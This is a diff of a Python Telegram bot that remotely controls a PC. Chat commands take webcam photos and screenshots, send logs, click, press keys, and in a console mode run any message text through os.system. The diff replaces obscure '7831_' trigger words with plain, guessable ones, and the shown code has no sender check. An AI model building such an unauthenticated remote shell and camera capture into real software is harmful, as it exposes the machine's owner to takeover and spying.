@@ -24,7 +24,7 @@ def message_reply(message):
     global sysmode
     global alertmode
     global writemode
-    if message.text=="cam1":
+    if message.text=="camera":
         current_datetime = datetime.now()
         print("CAMERA @" + str(message.from_user.username))
         write_data_time = str(current_datetime)
@@ -36,7 +36,7 @@ def message_reply(message):
         photo = open('camera1.png', 'rb')
         bot.send_photo(message.chat.id, photo)
         photo.close()
-    elif message.text=="7831_logs":
+    elif message.text=="logs":
         logf = open("logs.log", "r")
         for line in logf:
             try:
@@ -44,7 +44,7 @@ def message_reply(message):
             except:
                 x = 6
         logf.close()
-    elif message.text=="7831_screenshot":
+    elif message.text=="screenshot":
         current_datetime = datetime.now()
         write_data_time = str(current_datetime)
         print(write_data_time + " SCREENSHOT @" + str(message.from_user.username))
@@ -54,7 +54,7 @@ def message_reply(message):
         logging.info("SCREENSHOT @" + str(message.from_user.username))
         
         bot.send_photo(message.chat.id, scre)
-    elif message.text=="7831_7_sys":
+    elif message.text=="sys_mode":
         if sysmode == 1:
             sysmode = 0
             bot.send_message(message.chat.id, "Режим консоли успешно выключён!")
@@ -65,56 +65,56 @@ def message_reply(message):
         if sysmode == 1:
             os.system(message.text)
             bot.send_message(message.chat.id, "Выполнена команда на ПК!")
-    elif message.text=="7831_alertmode":
+    elif message.text=="alert_mode":
         if alertmode == 1:
             alertmode = 0
             bot.send_message(message.chat.id, "Режим сообщения успешно выключён!")
         else:
             alertmode = 1
             bot.send_message(message.chat.id, "Режим сообщения успешно включён!")
-    elif message.text=="7831_writemode":
+    elif message.text=="write_mode":
         if writemode == 1:
             writemode = 0
             bot.send_message(message.chat.id, "Режим печатанья успешно выключён!")
         else:
             writemode = 1
             bot.send_message(message.chat.id, "Режим печатанья успешно включён!")
-    elif message.text=="7831_click":
+    elif message.text=="click":
         click()
         bot.send_message(message.chat.id, "Выполнено нажатие мыши!")
         screenshot("screen.png")
         scre = open('screen.png', 'rb')
         logging.info("SCREENSHOT BY CLICK @" + str(message.from_user.username))
         bot.send_photo(message.chat.id, scre)
-    elif message.text == "7831_dclick":
+    elif message.text == "dclick":
         doubleClick()
         bot.send_message(message.chat.id, "Выполнено двойное нажатие мыши!")
         screenshot("screen.png")
         scre = open('screen.png', 'rb')
         logging.info("SCREENSHOT BY DCLICK @" + str(message.from_user.username))
         bot.send_photo(message.chat.id, scre)
-    elif message.text == "7831_kb_esc":
+    elif message.text == "kb_esc":
         press("esc")
         bot.send_message(message.chat.id, "Нажато ESCAPE!")
         screenshot("screen.png")
         scre = open('screen.png', 'rb')
         logging.info("SCREENSHOT BY ESCAPE @" + str(message.from_user.username))
         bot.send_photo(message.chat.id, scre)
-    elif message.text == "7831_kb_enter":
+    elif message.text == "kb_enter":
         press("enter")
         bot.send_message(message.chat.id, "Нажато ENTER!")
         screenshot("screen.png")
         scre = open('screen.png', 'rb')
         logging.info("SCREENSHOT BY ENTER @" + str(message.from_user.username))
         bot.send_photo(message.chat.id, scre)
-    elif message.text == "7831_win_lock":
+    elif message.text == "kb_win_l":
         hotkey('windows', 'l')
         bot.send_message(message.chat.id, "В данный момент команда не работает!")
         screenshot("screen.png")
         scre = open('screen.png', 'rb')
         logging.info("SCREENSHOT BY WINLOCK @" + str(message.from_user.username))
         bot.send_photo(message.chat.id, scre)
-    elif message.text == "7831_alt_tab":
+    elif message.text == "kb_alt_tab":
         hotkey('alt', 'tab')
         bot.send_message(message.chat.id, "Отправлено!")
         screenshot("screen.png")
